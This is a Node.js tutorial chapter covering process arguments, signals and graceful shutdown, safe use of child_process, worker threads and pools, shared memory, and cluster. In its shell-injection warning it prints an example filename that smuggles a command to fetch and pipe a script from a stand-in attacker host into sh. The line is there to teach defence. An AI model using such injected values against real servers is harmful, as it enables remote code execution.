# Node.js — Processes & Parallelism (Parts 8–9)

Your program as an operating-system citizen: arguments, environment, signals and exit codes; how to run other programs without opening a shell-injection hole; and the two ways out of the single-threaded box — worker threads and multiple processes — plus an honest account of when neither is the answer.

> **Spec:** this doc follows the shared spec in [`nodejs-mastery-guide.md`](./nodejs-mastery-guide.md#about-this-document) — curiosity-driven framing, Beginner → Mastery tiers (collapsed where a tier would be filler, always stated), **Try It** exercises with expected output, wrong-vs-right pairs, official docs cited inline. Written against **Node.js 24 LTS**, verified **September 14, 2026**.
>
> **Prerequisite:** [Part 2 — The Event Loop](./nodejs-runtime-foundations.md#part-2--the-event-loop). Everything in Part 9 is a response to the fact that there is one thread.

---

## Table of Contents

- [Part 8 — The Process](#part-8--the-process)
  - [Beginner: arguments, environment, exit](#p8-beginner)
  - [Working Knowledge: `parseArgs`, signals, and graceful shutdown](#p8-working)
  - [Advanced: running other programs safely](#p8-advanced)
  - [Mastery: stdio wiring, IPC, and detached processes](#p8-mastery)
  - [Part 8 cheat sheet](#part-8-cheat-sheet)
- [Part 9 — Threads & Parallelism](#part-9--threads--parallelism)
  - [Beginner: when you actually need another thread](#p9-beginner)
  - [Working Knowledge: `worker_threads`](#p9-working)
  - [Advanced: worker pools, and the cost of messages](#p9-advanced)
  - [Mastery: shared memory, `cluster`, and choosing between the options](#p9-mastery)
  - [Part 9 cheat sheet](#part-9-cheat-sheet)

---

## Part 8 — The Process

`process` is a global you never import, and it is the seam between your JavaScript and the machine. Most of it is uninteresting; four parts of it decide whether your program behaves well in a container.

<a id="p8-beginner"></a>

### Beginner: arguments, environment, exit

```js
process.argv          // ['/path/to/node', '/path/to/script.js', ...yourArgs]
process.env.PORT      // a string, or undefined — never a number
process.exitCode = 1  // how to fail
process.cwd()         // where the user was standing
process.pid
process.platform      // 'linux' | 'darwin' | 'win32'
```

Two traps, both immediate.

**Environment variables are always strings**, and `undefined` is common:

```js
// ✗ wrong — '3000' + 1 is '30001', and a missing var makes this NaN
const port = process.env.PORT;

// ✓ right — parse, default, and validate
const port = Number(process.env.PORT ?? 3000);
if (!Number.isInteger(port)) throw new Error(`Bad PORT: ${process.env.PORT}`);
```

**Exit with `process.exitCode`, not `process.exit()`** — as [Part 1](./nodejs-runtime-foundations.md#p1-working) noted, `exit()` doesn't wait for pending writes, so the last line of output can be lost when stdout is a pipe rather than a terminal. That is why CLI tools sometimes "lose" their final line only in CI.

<a id="p8-working"></a>

### Working Knowledge: `parseArgs`, signals, and graceful shutdown

#### `util.parseArgs` — no dependency needed

```js
import { parseArgs } from 'node:util';

const { values, positionals } = parseArgs({
  options: {
    port:    { type: 'string',  short: 'p', default: '3000' },
    verbose: { type: 'boolean', short: 'v' },
    tag:     { type: 'string',  multiple: true },
  },
  allowPositionals: true,
});

// node cli.js -v --port 8080 --tag a --tag b input.txt
// values      → { port: '8080', verbose: true, tag: ['a', 'b'] }
// positionals → ['input.txt']
```

It handles short flags, `--flag=value`, repeated options and `--` correctly. It deliberately does *not* generate help text or validate types beyond string/boolean — for a real CLI you may still want a library, but for the scripts that make up most of what people actually write, this is enough and it is already installed.

#### Signals, and why your container takes 30 seconds to stop

A signal is the OS asking your process to do something. Two matter:

| Signal | Sent by | What you must do |
|---|---|---|
| `SIGTERM` | orchestrators, `docker stop`, `kill` | Shut down cleanly, promptly |
| `SIGINT` | Ctrl-C | Same |

The contract is a deadline: Docker and Kubernetes send `SIGTERM`, wait (10 s and 30 s respectively by default), then send `SIGKILL`, which cannot be caught. **If you ignore `SIGTERM`, every deploy pauses for that full grace period and every in-flight request is severed at the end of it.**

```js
// ✗ wrong — no handler. The orchestrator waits out the grace period, then kills you mid-request.

// ✓ right
async function shutdown(signal) {
  log.info({ signal }, 'shutting down');
  server.close();                         // stop accepting new connections
  await once(server, 'close');            // wait for in-flight requests to finish
  await pool.end();                       // close the DB pool
  process.exitCode = 0;                   // let the loop drain and exit naturally
}

for (const sig of ['SIGTERM', 'SIGINT']) {
  process.once(sig, () => { shutdown(sig).catch(() => process.exit(1)); });
}
```

`process.once`, not `process.on`: a second Ctrl-C should kill you immediately rather than start a second shutdown. The full production treatment — including the load-balancer race that makes `server.close()` alone insufficient — is in [Part 13](./nodejs-production-diagnostics.md#part-13--production-node).

**Try It — feel the grace period.**

```js
// slow.mjs
setInterval(() => {}, 1000);
console.log('running, pid', process.pid);
```

Run `node slow.mjs`, then from another terminal `kill <pid>` — it dies instantly, because with no handler the default `SIGTERM` action is termination. Now add a handler that does nothing:

```js
process.on('SIGTERM', () => console.log('ignoring SIGTERM'));
```

`kill <pid>` now prints the message and the process **keeps running**. Only `kill -9 <pid>` stops it. That is exactly the state a half-written shutdown handler leaves you in, and it is why "the deploy hangs for 30 seconds" is so often a `SIGTERM` handler that forgot to actually exit.

<a id="p8-advanced"></a>

### Advanced: running other programs safely

`node:child_process` offers four functions, and the choice between two of them is a security decision ([child_process docs](https://nodejs.org/docs/latest-v24.x/api/child_process.html)):

| Function | Shell? | Use it for |
|---|---|---|
| `spawn` | No | Anything streaming, anything long-running — **the default choice** |
| `execFile` | No | A program whose complete output you want as a string |
| `exec` | **Yes** | Only when you genuinely need shell features, with no untrusted input |
| `fork` | No | A child Node process, with an IPC channel |

#### The injection hole

```js
// ✗ wrong — `exec` runs this through /bin/sh. A filename of
//   "x.txt; curl evil.com/s | sh" is a remote shell on your server.
exec(`wc -l ${userFilename}`, cb);

// ✓ right — no shell exists; the argument is passed to the program as one opaque string
execFile('wc', ['-l', userFilename], cb);
```

There is no escaping function that makes the first form safe — quoting rules differ between `sh` and `cmd.exe`, and every hand-rolled sanitiser has been broken. **The rule is absolute: if any part of the command line comes from outside your program, do not use `exec` or `{ shell: true }`.**

#### The other `exec` trap: `maxBuffer`

`exec` and `execFile` buffer the child's entire output in memory, capped at **1 MB** by default. Exceed it and the child is killed and you get an error — which looks like the child crashed:

```js
// ✗ wrong for large output — dies at 1 MB with ERR_CHILD_PROCESS_STDIO_MAXBUFFER
const { stdout } = await execFileAsync('git', ['log', '--format=%H']);

// ✓ right — stream it
const child = spawn('git', ['log', '--format=%H']);
for await (const line of createInterface({ input: child.stdout })) { /* … */ }
```

#### The everyday shape

```js
import { spawn } from 'node:child_process';
import { once } from 'node:events';

const child = spawn('ffmpeg', ['-i', input, '-vn', output], { stdio: 'inherit' });
const [code] = await once(child, 'exit');
if (code !== 0) throw new Error(`ffmpeg exited ${code}`);
```

Three details worth internalising:

- **A non-zero exit code is not an `'error'` event.** `'error'` means the process could not be *started* (`ENOENT` — the binary isn't there). A program that ran and failed exits with a code. Check both.
- **`stdio: 'inherit'`** wires the child straight to your terminal — the right default for build tools, and it sidesteps `maxBuffer` entirely.
- **Every child needs a timeout**, or a hung subprocess hangs you: `spawn(cmd, args, { timeout: 30_000, killSignal: 'SIGKILL' })`.

<a id="p8-mastery"></a>

### Mastery: stdio wiring, IPC, and detached processes

#### `stdio` is an array of file descriptors

```js
spawn('prog', args, { stdio: ['ignore', 'pipe', 'inherit'] });
//                              stdin    stdout  stderr
```

Each slot takes `'pipe'` (a stream on the `ChildProcess`), `'inherit'` (the parent's), `'ignore'` (`/dev/null`), a raw fd, or a stream. Which makes some elegant things possible — logging a child's output straight to a file with no JavaScript in the path at all:

```js
const out = await open('./build.log', 'a');
spawn('npm', ['run', 'build'], { stdio: ['ignore', out.fd, out.fd] });
```

The child writes directly to the file descriptor. Your process never sees a byte, which means no buffering, no backpressure to manage, and no CPU cost.

#### IPC with `fork`

`fork` starts a Node child with a structured-clone message channel attached ([child_process docs](https://nodejs.org/docs/latest-v24.x/api/child_process.html)):

```js
// parent.mjs
const child = fork('./child.mjs');
child.send({ job: 42 });
child.on('message', (msg) => console.log('result', msg));

// child.mjs
process.on('message', async (msg) => {
  process.send({ done: await work(msg.job) });
});
```

The genuinely unusual capability: **you can send a live server or socket handle to a child**, and the OS hands the connection over. That is the mechanism `cluster` is built on, and it's how several processes can accept on one port.

#### Detached processes

To start something that outlives you:

```js
const child = spawn('node', ['daemon.js'], {
  detached: true,
  stdio: 'ignore',     // required: an open pipe keeps the parent's loop alive
});
child.unref();          // stop counting this child as a reason to stay running
```

Both parts are necessary. `detached` puts the child in its own process group so it doesn't receive the parent's Ctrl-C; `unref()` plus `stdio: 'ignore'` removes every handle tying the parent's event loop to the child. Miss either one and the parent hangs — the [Part 2 handle-lifecycle rule](./nodejs-runtime-foundations.md#p2-mastery) again.

<a id="part-8-cheat-sheet"></a>

### Part 8 cheat sheet

| Want | How |
|---|---|
| CLI arguments | `process.argv.slice(2)`, or `parseArgs` from `node:util` |
| Read config | `process.env.X` — always a string, often `undefined` |
| Fail | `process.exitCode = 1` |
| Handle shutdown | `process.once('SIGTERM', …)` and `process.once('SIGINT', …)` |
| Run a program | `spawn(cmd, args)` |
| Run and collect output | `execFile(cmd, args)` — **never** `exec` with untrusted input |
| Show child output in your terminal | `{ stdio: 'inherit' }` |
| Child output to a file | `{ stdio: ['ignore', fd, fd] }` |
| Wait for a child | `const [code] = await once(child, 'exit')` |
| Time-limit a child | `{ timeout: 30_000, killSignal: 'SIGKILL' }` |
| Talk to a Node child | `fork()` + `child.send()` / `process.on('message')` |
| Survive the parent | `{ detached: true, stdio: 'ignore' }` + `child.unref()` |

**Gotchas:** `exec` runs a shell — user input there is RCE · `exec`/`execFile` cap output at 1 MB · `'error'` means "couldn't start", not "exited non-zero" · a `SIGTERM` handler that never exits makes your process unkillable except by `SIGKILL`.

[↑ Back to top](#table-of-contents)

---

## Part 9 — Threads & Parallelism

Node's single thread is a good deal until it isn't. This Part is about the exits — and, just as importantly, about how often the right answer is "don't".

<a id="p9-beginner"></a>

### Beginner: when you actually need another thread

Start with the test, because it saves most people the rest of the Part:

```
   Is the work CPU-bound?
        │
        ├── No (waiting on a DB, an API, a disk) ──► You need NOTHING.
        │                                            Async I/O already handles this.
        │                                            A worker would be slower.
        │
        └── Yes (hashing, parsing, resizing, compiling)
              │
              ├── Does it already run on libuv's thread pool?
              │   (crypto KDFs, zlib) ───────────► Use the async version. Done.
              │
              ├── Need shared memory or fast handoff? ──► worker_threads
              │
              └── Need isolation / a non-Node program? ► child_process, or a queue
```

**The most common mistake in this whole Part is using workers for I/O.** Fetching ten URLs in a worker is strictly worse than `Promise.all` on the main thread: you pay thread startup and message serialisation to do work that was never blocking anything.

<a id="p9-working"></a>

### Working Knowledge: `worker_threads`

A worker is a **separate V8 instance with its own heap and its own event loop**, inside the same process ([worker_threads docs](https://nodejs.org/docs/latest-v24.x/api/worker_threads.html)). Nothing is shared by default — no variables, no module state, no `process.env` writes.

```js
// main.mjs
import { Worker } from 'node:worker_threads';

const worker = new Worker(new URL('./hash-worker.mjs', import.meta.url), {
  workerData: { password: 'hunter2' },
});

worker.on('message', (hash) => console.log('hash', hash));
worker.on('error', (err) => console.error(err));
worker.on('exit', (code) => { if (code !== 0) console.error('exited', code); });
```

```js
// hash-worker.mjs
import { parentPort, workerData } from 'node:worker_threads';
import { scryptSync } from 'node:crypto';

const hash = scryptSync(workerData.password, 'salt', 64).toString('hex');
parentPort.postMessage(hash);
```

Note `new URL(..., import.meta.url)` rather than a bare `'./hash-worker.mjs'` string: the worker path is resolved against the *current working directory*, not the module, so a relative string breaks as soon as someone runs your program from elsewhere.

#### Messages are structured-cloned, not JSON

`postMessage` uses the structured clone algorithm, so it handles `Map`, `Set`, `Date`, `RegExp`, `BigInt`, typed arrays and circular references — everything `JSON.stringify` loses. What it cannot send is anything with behaviour: functions, class instances (you get a plain object, prototype gone), DOM-style handles.

```js
// ✗ wrong — arrives as a plain object; `user.isAdmin()` is not a function
worker.postMessage(new User({ id: 1 }));

// ✓ right — send data, reconstruct on the other side
worker.postMessage({ id: 1, role: 'admin' });
```

#### Error handling is a different universe

An exception inside a worker does **not** propagate to the main thread's `try`/`catch`. It arrives as an `'error'` event. A worker without an `'error'` listener fails silently — the thread dies and your `await` never settles, which presents as a hang rather than a crash. Always attach all three of `'message'`, `'error'` and `'exit'`.

<a id="p9-advanced"></a>

### Advanced: worker pools, and the cost of messages

#### Don't create a worker per task

Starting a worker means booting a whole V8 isolate: tens of milliseconds and several megabytes. For tasks measured in milliseconds, creation dominates.

```js
// ✗ wrong — a fresh V8 isolate per request
app.post('/hash', async (req, res) => {
  const w = new Worker('./hash-worker.mjs', { workerData: req.body });
  res.json(await once(w, 'message'));
});

// ✓ right — a fixed pool, created once at startup
const pool = new WorkerPool('./hash-worker.mjs', os.availableParallelism());
app.post('/hash', async (req, res) => res.json(await pool.run(req.body)));
```

`os.availableParallelism()` is the right size, and it is the modern replacement for `os.cpus().length` ([the PR that added it](https://github.com/nodejs/node/pull/45895)). `cpus().length` reports the *host's* cores and ignores container CPU quotas: in a pod limited to 2 cores on a 64-core node it says 64, and you get 64 threads fighting over 2 cores. `availableParallelism()` reads CPU affinity and, in current libuv, the cgroup quota too.

**Verify it in your actual container rather than trusting either function.** The cgroup handling has had real bugs — libuv 1.49.1 onwards returned different answers under cgroups v1 and v2 ([libuv#4740](https://github.com/libuv/libuv/issues/4740)), which surfaced in Node 22.12+ as a parallelism of 1 on a 4-core machine ([nodejs/node#58428](https://github.com/nodejs/node/issues/58428)). A one-line `node -p "os.availableParallelism()"` inside the running pod settles it, and a `WORKERS` env var override is cheap insurance.

A minimal pool, complete, because the shape is worth seeing:

```js
import { Worker } from 'node:worker_threads';

export class WorkerPool {
  #idle = []; #queue = []; #all = [];

  constructor(url, size) {
    for (let i = 0; i < size; i++) {
      const w = new Worker(url);
      w.on('error', (err) => this.#fail(w, err));
      this.#all.push(w);
      this.#idle.push(w);
    }
  }

  run(data) {
    return new Promise((resolve, reject) => {
      const job = { data, resolve, reject };
      const w = this.#idle.pop();
      w ? this.#dispatch(w, job) : this.#queue.push(job);
    });
  }

  #dispatch(w, job) {
    w.once('message', (result) => {
      job.resolve(result);
      const next = this.#queue.shift();
      next ? this.#dispatch(w, next) : this.#idle.push(w);
    });
    w.postMessage(job.data);
  }

  #fail(w, err) { /* replace the dead worker, reject its in-flight job */ }

  async close() { await Promise.all(this.#all.map((w) => w.terminate())); }
}
```

The `#fail` stub is where real pools earn their keep — a worker that dies mid-job must be replaced and its promise rejected, or the pool silently shrinks to zero over a few days and every request hangs.

#### Transfer, don't clone

Structured cloning **copies**. Sending a 100 MB buffer to a worker allocates 100 MB on the other side. Transferring moves ownership instead, at effectively zero cost:

```js
// ✗ wrong — copies 100 MB
worker.postMessage({ pixels: bigArrayBuffer });

// ✓ right — moves it; the sender's copy becomes unusable, which is the point
worker.postMessage({ pixels: bigArrayBuffer }, [bigArrayBuffer]);
```

After transfer, every `TypedArray` view of that buffer in the sending thread is detached — reading one throws. That is intentional: it is what makes the transfer safe without locks.

**Real Scenario — the image service that got slower with workers.** A thumbnailing service moves resizing into a worker pool and sees *worse* p99 latency. The resize itself is faster, but each request now copies a 40 MB decoded bitmap into the worker and a 2 MB result back — and structured cloning happens **on the sending thread**, synchronously. The main thread was blocked for longer serialising the image than it had ever been resizing it. The fix was to transfer the `ArrayBuffer` instead of cloning it, at which point the pool did what it was supposed to. The general lesson: **a worker moves computation off the main thread, but the message cost stays on it.**

<a id="p9-mastery"></a>

### Mastery: shared memory, `cluster`, and choosing between the options

#### `SharedArrayBuffer` — actually shared

The one memory that is genuinely common to several threads. Every access must go through `Atomics` to be safe:

```js
const shared = new SharedArrayBuffer(4);
const counter = new Int32Array(shared);

// in any thread
Atomics.add(counter, 0, 1);        // atomic increment
Atomics.load(counter, 0);          // atomic read
Atomics.wait(counter, 0, 0);       // block this thread until the value changes
Atomics.notify(counter, 0);        // wake a waiter
```

`Atomics.wait()` **blocks the calling thread**, which is forbidden on the main thread and is exactly what you want inside a worker waiting for work. It is the primitive that makes a real synchronous work queue possible.

This is the deepest end of Node's concurrency, and the honest advice is that most applications should never reach it. It exists for shared ring buffers, cross-thread counters and lock-free queues — and those come with every data race JavaScript has spent twenty years not having.

#### `cluster` — many processes, one port

```js
import cluster from 'node:cluster';
import { availableParallelism } from 'node:os';

if (cluster.isPrimary) {
  for (let i = 0; i < availableParallelism(); i++) cluster.fork();
  cluster.on('exit', () => cluster.fork());     // restart the dead one
} else {
  startServer();                                 // each worker listens on the same port
}
```

The primary accepts connections and distributes them to child processes via the handle-passing mechanism from [Part 8](#p8-mastery). Every worker gets a full core and a separate heap, and one crashing doesn't touch the others.

**When to use it: rarely.** In containers, the platform already runs N replicas of your image, and that gives you the same parallelism plus independent scheduling, rolling restarts and per-instance metrics. `cluster` inside a container mostly duplicates the orchestrator's job while making your memory limits harder to reason about. It earns its place on a single VM you control, or for a CLI that wants to use the whole machine.

#### The decision table

| Situation | Answer | Why |
|---|---|---|
| Waiting on I/O | Nothing — plain `async` | The loop already handles it |
| `crypto` KDF, `zlib` | The async form | Already on libuv's thread pool |
| CPU work, big data, shared state | `worker_threads` | Shared memory, cheap-ish handoff |
| CPU work, isolation matters | `child_process` | A crash can't take you with it |
| Running another program | `spawn` | Not a JS problem at all |
| Using every core for one server | Your orchestrator's replicas | Fewer moving parts than `cluster` |
| Work that may outlive the request | A job queue + separate service | Neither threads nor processes survive a deploy |

That last row is the one that matters most in practice and is the least often reached for. If the work can take minutes, can fail, or must survive a restart, it does not belong in the request's process at all — and no amount of thread tuning changes that.

> **vs. Bun** — Bun implements `worker_threads` and Web `Worker`, but `cluster` support has historically lagged, and JavaScriptCore's threading characteristics differ from V8's. Code that leans on `cluster` is the likeliest thing in this Part to behave differently. See [`bun-node-compat-internals.md`](../bun/bun-node-compat-internals.md).

<a id="part-9-cheat-sheet"></a>

### Part 9 cheat sheet

| Want | How |
|---|---|
| Parallel I/O | `Promise.all` — **not** a worker |
| A CPU task off the main thread | `new Worker(new URL('./w.mjs', import.meta.url))` |
| Pass data in at startup | `{ workerData }` |
| Talk to a worker | `worker.postMessage()` / `parentPort.on('message')` |
| Correct pool size | `os.availableParallelism()` (**not** `os.cpus().length`) |
| Avoid copying a big buffer | `postMessage(v, [arrayBuffer])` — transfer |
| Shared counter across threads | `SharedArrayBuffer` + `Atomics` |
| Block a worker until signalled | `Atomics.wait()` (never on the main thread) |
| Stop a worker | `await worker.terminate()` |
| Cap a worker's memory | `{ resourceLimits: { maxOldGenerationSizeMb: 512 } }` |
| Every core, one port | `cluster` — or, better, your orchestrator |

**Gotchas:** workers don't help with I/O · structured clone drops class prototypes and functions · cloning happens synchronously on the sending thread · a worker error is an `'error'` event, never a `throw` you can catch · a worker per task costs more than it saves · `os.cpus().length` ignores container CPU limits.

[↑ Back to top](#table-of-contents)

---

**Next:** [Part 10 — HTTP Servers](./nodejs-http-networking.md) · **Previous:** [Parts 6–7](./nodejs-files-streams-buffers.md) · **Up:** [Overview](./nodejs-mastery-guide.md)

*Written against Node.js 24 LTS · Verified September 14, 2026*
